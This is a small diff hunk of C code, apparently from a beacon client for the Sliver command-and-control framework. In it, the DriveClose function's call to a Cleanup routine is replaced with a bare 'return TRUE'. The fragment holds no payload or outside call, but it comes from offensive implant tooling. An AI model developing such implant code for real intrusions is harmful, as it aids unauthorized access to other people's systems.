@@ -210,7 +210,7 @@ BOOL DriveClose
 	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
 )
 {
-	return pBeaconClient->Cleanup(pBeaconClient);
+	return TRUE;
 }
 
 BOOL DriveUpload
